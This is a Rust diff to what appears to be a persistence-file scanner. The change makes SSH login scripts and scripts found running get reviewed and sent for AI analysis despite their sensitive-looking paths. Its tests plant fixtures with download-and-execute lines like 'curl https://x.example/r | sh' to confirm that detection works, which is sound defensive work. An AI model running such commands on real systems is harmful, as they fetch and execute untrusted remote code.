@@ -116,7 +116,11 @@ fn examine(
                 // Reviewed, and sent to the AI, without the values that
                 // look like secrets.
                 let text = without_secrets(text);
+                let gaps = report.gaps.len();
                 review::analyze_text(report, &label, &text, false);
+                if is_code(item, &text) {
+                    send_despite_its_path(report, gaps, &label, &text);
+                }
                 // Every item is persistence already; naming another start-up
                 // file (`.bash_profile` sourcing `.bashrc`) is not news.
                 drop_rule(report, before, RuleId::PersistenceModification);
@@ -192,6 +196,8 @@ fn is_local_only(item: &Item, home: Option<&str>) -> bool {
     let path = collect::stands_for(item);
     let name = path.rsplit('/').next().unwrap_or_default();
     match item.category {
+        // The login script is code, not configuration: it is reviewed.
+        Category::Ssh if commands::is_ssh_rc(path) => false,
         Category::Ssh | Category::Git => in_home && named,
         Category::Account => true,
         Category::Trust => named,
@@ -205,6 +211,41 @@ fn is_local_only(item: &Item, home: Option<&str>) -> bool {
         Category::Shell => named && name == "fish_variables",
         _ => false,
     }
+}
+
+/// Whether `item`, with content `text`, is code and not a file that only
+/// holds settings: the SSH server's login script, a file a live check
+/// found running, or a script (by its `#!` line) that a command names.
+/// Such a file is reviewed whatever its path looks like: a script in
+/// `~/.ssh` or one called `rotate-token.sh` is still what runs. A file a
+/// start-up file merely reads in (`source ~/.secrets`) has no such line as
+/// a rule, and stays withheld: that is where exported keys are kept.
+fn is_code(item: &Item, text: &str) -> bool {
+    commands::is_ssh_rc(collect::stands_for(item))
+        || item.category.is_live()
+        || (item.run_by.is_some()
+            && collect::configuration_of(item).is_none()
+            && text.starts_with("#!"))
+}
+
+/// Queues `text` for the AI review where it was withheld only for what its
+/// path looks like (see `rules::is_sensitive_path`): the gaps from `from`
+/// on are the ones this file's review added.
+fn send_despite_its_path(report: &mut Report, from: usize, label: &str, text: &str) {
+    let withheld = |gap: &Gap| matches!(gap, Gap::SensitiveWithheld(path) if path == label);
+    if !report.gaps[from..].iter().any(withheld) {
+        return;
+    }
+    let mut index = 0;
+    report.gaps.retain(|gap| {
+        let keep = index < from || !withheld(gap);
+        index += 1;
+        keep
+    });
+    report.agent_input.push(crate::agent::SourceFile {
+        path: label.to_string(),
+        content: text.to_string(),
+    });
 }
 
 fn drop_rule(report: &mut Report, from: usize, rule: RuleId) {
@@ -427,12 +468,6 @@ fn local_checks(report: &mut Report, item: &Item, label: &str, text: &str) {
         .rsplit('/')
         .next()
         .unwrap_or_default();
-    if name == "rc" {
-        report
-            .findings
-            .push(finding(label, 1, RuleId::SshCommand, ""));
-        return;
-    }
     for (index, line) in text.lines().enumerate() {
         let line = line.trim();
         if line.starts_with('#') {
@@ -570,6 +605,7 @@ fn fact(item: &Item, label: &str) -> String {
 mod tests {
     use super::{fact, is_local_only, label, local_checks, located};
     use crate::autorun::Category;
+    use crate::report::Gap;
     use crate::report::Report;
     use crate::rules::RuleId;
     use std::collections::HashSet;
@@ -945,8 +981,12 @@ mod tests {
                 "{label}: {findings:?}"
             );
         }
-        // `~/.ssh` is a path whose files are withheld from the AI by name.
-        assert_eq!(sent, ["~/bin/miner.sh", "~/work/hosts"]);
+        // Found running, a file is code: it is sent wherever it lies,
+        // `~/.ssh` included.
+        assert_eq!(
+            sent,
+            ["~/.ssh/config.d/extra", "~/bin/miner.sh", "~/work/hosts"]
+        );
     }
 
     #[test]
@@ -984,7 +1024,6 @@ mod tests {
         };
         let collection = collect::collect(&scope);
         for path in [
-            "home/u/dotfiles/sshrc",
             "home/u/dotfiles/keys",
             "mnt/dot/gitconfig",
             "mnt/dot/sshconfig",
@@ -993,12 +1032,17 @@ mod tests {
             assert!(is_local_only(item.unwrap(), home), "{path}");
         }
         let (sent, findings) = examined(&collection);
-        assert!(sent.is_empty(), "{sent:?}");
-        // The login script and the key's option, as for the files unlinked.
-        for label in ["~/dotfiles/sshrc", "~/dotfiles/keys"] {
+        // The login script is code under whatever name it is kept: read by
+        // the rules and sent. The key's option is told as for the file
+        // unlinked.
+        assert_eq!(sent, ["~/dotfiles/sshrc"]);
+        for found in [
+            ("~/dotfiles/sshrc", RuleId::DownloadAndExecute),
+            ("~/dotfiles/keys", RuleId::SshCommand),
+        ] {
             assert!(
-                findings.contains(&(label.to_string(), RuleId::SshCommand)),
-                "{label}: {findings:?}"
+                findings.contains(&(found.0.to_string(), found.1)),
+                "{found:?}: {findings:?}"
             );
         }
         // And the key is listed, under the file the server reads.
@@ -1011,14 +1055,109 @@ mod tests {
     }
 
     #[test]
+    fn the_login_script_of_the_ssh_server_is_reviewed_as_the_script_it_is() {
+        let dir = planted(
+            "sweep-ssh-rc",
+            &[
+                (
+                    "home/u/.ssh/rc",
+                    "export API_TOKEN=abcdefgh12345678\ncurl https://x.example/r | sh\n~/bin/at-login.sh &\n",
+                ),
+                (
+                    "home/u/bin/at-login.sh",
+                    "#!/bin/sh\ncurl https://x.example/l | sh\n",
+                ),
+                ("home/u/.ssh/config", "Host internal\n  User secret-name\n"),
+                // A script under `~/.ssh` that a command names is code too.
+                (
+                    "home/u/.ssh/hook.sh",
+                    "#!/bin/sh\ncurl https://x.example/k | sh\n",
+                ),
+                (
+                    "home/u/.config/systemd/user/hook.service",
+                    "[Service]\nExecStart=%h/.ssh/hook.sh\n",
+                ),
+                // What a start-up file merely reads in stays withheld by its
+                // name: that is where exported keys are kept.
+                ("home/u/.bashrc", ". ~/.ssh/env\n"),
+                ("home/u/.ssh/env", "export OTHER=abcdefgh12345678\n"),
+                ("etc/ssh/sshrc", "curl https://x.example/e | sh\n"),
+            ],
+            &[],
+        );
+        let index = PackageIndex::with_foreign(HashSet::new());
+        let home = Some("home/u");
+        let scope = Scope {
+            root: dir.path(),
+            home,
+            index: &index,
+            origin: Origin::System,
+        };
+        let collection = collect::collect(&scope);
+        let rc = collection
+            .items
+            .iter()
+            .find(|item| item.path == "home/u/.ssh/rc")
+            .unwrap();
+        assert!(!is_local_only(rc, home));
+        // Looked through for what it starts, as a start-up file is.
+        assert_eq!(rc.runs, ["~/bin/at-login.sh"]);
+
+        let mut report = Report::new("t");
+        super::examine(&mut report, &collection, home, &HashSet::new());
+        let sent = |path: &str| report.agent_input.iter().find(|file| file.path == path);
+        for script in [
+            "~/.ssh/rc",
+            "~/bin/at-login.sh",
+            "~/.ssh/hook.sh",
+            "/etc/ssh/sshrc",
+        ] {
+            assert!(sent(script).is_some(), "{script} was not queued");
+            assert!(
+                report
+                    .findings
+                    .iter()
+                    .any(|finding| finding.path == script
+                        && finding.rule == RuleId::DownloadAndExecute),
+                "{script}: {:?}",
+                report.findings
+            );
+        }
+        // With the masking every reviewed text gets.
+        assert!(
+            !sent("~/.ssh/rc")
+                .unwrap()
+                .content
+                .contains("abcdefgh12345678")
+        );
+        // Its being there is no finding by itself any more.
+        assert!(
+            !report
+                .findings
+                .iter()
+                .any(|finding| finding.rule == RuleId::SshCommand)
+        );
+        // Every other file under `~/.ssh` stays where it is.
+        for kept in ["~/.ssh/config", "~/.ssh/env"] {
+            assert!(sent(kept).is_none(), "{kept} was queued");
+        }
+        assert!(
+            report
+                .gaps
+                .iter()
+                .any(|gap| matches!(gap, Gap::SensitiveWithheld(path) if path == "~/.ssh/env"))
+        );
+    }
+
+    #[test]
     fn a_script_reads_nothing_in_as_configuration() {
         let dir = planted(
             "sweep-script-include",
             &[
-                ("home/u/.ssh/config", "Host x\n  ProxyCommand ~/bin/p.sh\n"),
+                ("home/u/.ssh/config", "Host x\n  ProxyCommand ~/bin/p\n"),
                 (
-                    "home/u/bin/p.sh",
-                    "#!/bin/sh\ninclude() { . \"$1\"; }\ninclude /home/u/lib/second.sh\n",
+                    "home/u/bin/p",
+                    "include() { . \"$1\"; }\ninclude /home/u/lib/second.sh\n",
                 ),
                 ("home/u/lib/second.sh", "curl https://x.example/s | sh\n"),
                 // A script that is itself a link: what it leads to is run.
